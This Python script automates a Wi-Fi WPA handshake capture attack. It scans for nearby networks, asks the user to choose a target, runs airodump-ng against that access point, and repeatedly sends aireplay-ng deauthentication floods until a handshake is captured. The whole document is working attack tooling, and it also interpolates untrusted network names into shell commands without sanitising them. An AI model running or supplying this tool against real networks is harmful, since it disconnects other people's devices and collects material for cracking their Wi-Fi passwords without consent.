#!/usr/bin/env python3
import subprocess
import re
import os
import signal
import time
import threading
from colorama import Fore

os.system('clear')

def get_wifi_networks(interface="wlan0"):
    result = subprocess.run(['iwlist', interface, 'scanning'], capture_output=True, text=True)
    
    ssid_regex = re.compile(r'ESSID:"(.*?)"')
    mac_regex = re.compile(r'Address: (.*?)\n')
    channel_regex = re.compile(r'Channel:(\d+)')
    encryption_regex = re.compile(r'IE: (IEEE 802\.11i/WPA2|WPA|WPA3|WPS)')
    signal_regex = re.compile(r'Signal level=(-\d+) dBm')

    ssids = ssid_regex.findall(result.stdout)
    macs = mac_regex.findall(result.stdout)
    channels = channel_regex.findall(result.stdout)
    encryptions = encryption_regex.findall(result.stdout)
    signals = signal_regex.findall(result.stdout)

    networks = []
    for i in range(len(ssids)):
        networks.append({
            "SSID": ssids[i],
            "MAC Address": macs[i],
            "Channel": channels[i] if i < len(channels) else "Unknown",
            "Encryption": ', '.join(set(encryptions)) if encryptions else "Open/Unknown",
            "Signal Strength": signals[i] + " dBm" if i < len(signals) else "Unknown"
        })

    return networks

def display_networks(networks):
    print(f"{'No.':<5}{'SSID':<30}{'MAC Address':<20}{'Channel':<10}{'Encryption':<20}{'Signal Strength':<15}")
    print("="*100)
    for idx, network in enumerate(networks, start=1):  # Start from 1
        print(f"{idx:<5}{network['SSID']:<30}{network['MAC Address']:<20}{network['Channel']:<10}{network['Encryption']:<20}{network['Signal Strength']:<15}")

def select_target_network(networks):
    while True:
        try:
            choice = int(input(f"\nSelect a network by number (1-{len(networks)}): "))  # Adjusted prompt
            if 1 <= choice <= len(networks):
                return networks[choice - 1]  # Adjusted index
            else:
                print(f"Invalid choice. Please select a number between 1 and {len(networks)}.")
        except ValueError:
            print("Invalid input. Please enter a number.")

def run_airodump(essid, channel, bssid, interface="wlan0"):
    output_file = f"{essid}_handshake"
    airodump_cmd = f'airodump-ng -w {output_file} -c {channel} --bssid {bssid} {interface}'
    process = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    return process, output_file

def run_aireplay(bssid, interface="wlan0"):
    aireplay_cmd = f'aireplay-ng --deauth 0 -a {bssid} {interface}'
    process = subprocess.Popen(aireplay_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, preexec_fn=os.setsid)
    return process

def monitor_handshake(airodump_process, aireplay_thread, output_file):
    print(Fore.LIGHTBLUE_EX + 'Listening For A Handshake...' + Fore.RESET)
    while True:
        output = airodump_process.stdout.readline().decode('utf-8')
        if "WPA handshake" in output:
            print(Fore.LIGHTGREEN_EX + "Handshake captured!" + Fore.RESET + '\n')
            os.killpg(os.getpgid(airodump_process.pid), signal.SIGTERM)
            aireplay_thread.stop()  # Ensure aireplay thread is stopped
            return True
        if airodump_process.poll() is not None:  # Check if process is terminated
            break
    return False

class AireplayThread(threading.Thread):
    def __init__(self, bssid, interface="wlan0"):
        super().__init__()
        self.bssid = bssid
        self.interface = interface
        self.aireplay_process = None
        self._stop_event = threading.Event()

    def run(self):
        while not self._stop_event.is_set():
            self.aireplay_process = run_aireplay(self.bssid, self.interface)
            time.sleep(10)  # Run for 10 seconds
            if self.aireplay_process:
                os.killpg(os.getpgid(self.aireplay_process.pid), signal.SIGTERM)
            time.sleep(15)  # Sleep for 15 seconds

    def stop(self):
        self._stop_event.set()
        if self.aireplay_process:
            os.killpg(os.getpgid(self.aireplay_process.pid), signal.SIGTERM)

def execute_command(command):
    start_time = time.time()
    subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    end_time = time.time()
    duration = end_time - start_time
    return duration

if __name__ == "__main__":
    try:
        interface = input("Enter the wireless interface (default: " + Fore.LIGHTBLUE_EX + "wlan0" + Fore.RESET + "): " + Fore.RESET) or "wlan0"
        subprocess.run('monitormode -stop', shell=True, stdout=open(os.devnull, 'wb'))
        networks = get_wifi_networks(interface)
        if networks:
            display_networks(networks)
            selected_network = select_target_network(networks)
            
            target_essid = selected_network['SSID']
            target_bssid = selected_network['MAC Address']
            target_channel = selected_network['Channel']
            target_encryption = selected_network['Encryption']
            target_signal_strength = selected_network['Signal Strength']
            
            os.system('clear')
            print("\nTarget Network Selected:")
            print(Fore.LIGHTBLUE_EX + "Name: " + Fore.YELLOW + str(target_essid) + Fore.RESET)
            print(Fore.LIGHTBLUE_EX + "Mac Address: " + Fore.YELLOW + str(target_bssid) + Fore.RESET)
            print(Fore.LIGHTBLUE_EX + "Channel: " + Fore.YELLOW + str(target_channel) + Fore.RESET)
            print(Fore.LIGHTBLUE_EX + "Encryption: " + Fore.YELLOW + str(target_encryption) + Fore.RESET)
            print(Fore.LIGHTBLUE_EX + "Signal Strength: " + Fore.YELLOW + str(target_signal_strength) + Fore.RESET + '\n')

            subprocess.run('monitormode -start', shell=True, stdout=open(os.devnull, 'wb'))
            
            # Start airodump-ng in a separate process
            airodump_process, output_file = run_airodump(target_essid, target_channel, target_bssid, interface)
            
            # Start aireplay-ng in a separate thread with cyclic deauth
            aireplay_thread = AireplayThread(target_bssid, interface)
            aireplay_thread.start()

            # Monitor airodump-ng output for handshake capture
            handshake_detected = monitor_handshake(airodump_process, aireplay_thread, output_file)

            # Wait for the airodump-ng process to finish
            airodump_process.wait()

            # Clean up
            aireplay_thread.stop()
            aireplay_thread.join()

    except KeyboardInterrupt:
        print("\nProgram interrupted. Cleaning up and exiting...")
        subprocess.run('monitormode -stop', shell=True, stdout=open(os.devnull, 'wb'))
